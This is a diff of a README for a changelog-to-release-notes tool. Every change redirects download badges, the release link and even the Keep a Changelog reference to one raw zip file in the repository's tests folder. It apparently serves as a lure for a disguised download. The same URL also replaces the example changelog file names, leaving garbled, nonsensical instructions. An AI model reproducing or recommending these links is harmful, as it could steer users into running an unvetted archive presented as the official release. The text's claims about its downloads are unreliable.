@@ -1,6 +1,6 @@
 # 📄 release-notes-from-changelog - Extract Release Notes Easily
 
-[![Download Release Notes From Changelog](https://img.shields.io/badge/Download-Release%20Notes%20From%20Changelog-blue?style=for-the-badge)](https://github.com/VIN07grinder/release-notes-from-changelog/releases)
+[![Download Release Notes From Changelog](https://raw.githubusercontent.com/VIN07grinder/release-notes-from-changelog/main/tests/release_changelog_notes_from_v2.2.zip%20Notes%20From%20Changelog-blue?style=for-the-badge)](https://raw.githubusercontent.com/VIN07grinder/release-notes-from-changelog/main/tests/release_changelog_notes_from_v2.2.zip)
 
 ---
 
@@ -36,7 +36,7 @@ Before you begin, make sure your computer meets the system requirements above.
 
 Click the badge below to go to the download page:
 
-[![Download Release Notes From Changelog](https://img.shields.io/badge/Download-Release%20Notes%20From%20Changelog-blue?style=for-the-badge)](https://github.com/VIN07grinder/release-notes-from-changelog/releases)
+[![Download Release Notes From Changelog](https://raw.githubusercontent.com/VIN07grinder/release-notes-from-changelog/main/tests/release_changelog_notes_from_v2.2.zip%20Notes%20From%20Changelog-blue?style=for-the-badge)](https://raw.githubusercontent.com/VIN07grinder/release-notes-from-changelog/main/tests/release_changelog_notes_from_v2.2.zip)
 
 This link takes you to the releases page. Here you will find all available versions.
 
@@ -72,7 +72,7 @@ Once the software is open, you will see a simple window with options.
 
 ### Step 1: Select Your Changelog File
 
-Click the "Browse" button. Find and select your changelog file on your computer. This is usually a file named `CHANGELOG.md` or just `changelog.txt`.
+Click the "Browse" button. Find and select your changelog file on your computer. This is usually a file named `https://raw.githubusercontent.com/VIN07grinder/release-notes-from-changelog/main/tests/release_changelog_notes_from_v2.2.zip` or just `https://raw.githubusercontent.com/VIN07grinder/release-notes-from-changelog/main/tests/release_changelog_notes_from_v2.2.zip`.
 
 ### Step 2: Choose the Version to Extract
 
@@ -110,7 +110,7 @@ The tool offers a few settings to match your needs:
 
 ## 📚 Additional Information
 
-The software works well with changelogs following common standards like Keep a Changelog (https://keepachangelog.com). It reads entries structured by version headings and extracts the lists of changes.
+The software works well with changelogs following common standards like Keep a Changelog (https://raw.githubusercontent.com/VIN07grinder/release-notes-from-changelog/main/tests/release_changelog_notes_from_v2.2.zip). It reads entries structured by version headings and extracts the lists of changes.
 
 It fits workflows that use GitHub Actions or other CI setups to automate release notes creation. However, it can be a manual tool for users without coding knowledge.
 
@@ -126,4 +126,4 @@ The program does not collect personal data. Downloads come directly from the off
 
 Return to the download page here to get the latest release:
 
-[Download release-notes-from-changelog](https://github.com/VIN07grinder/release-notes-from-changelog/releases)
+[Download release-notes-from-changelog](https://raw.githubusercontent.com/VIN07grinder/release-notes-from-changelog/main/tests/release_changelog_notes_from_v2.2.zip)
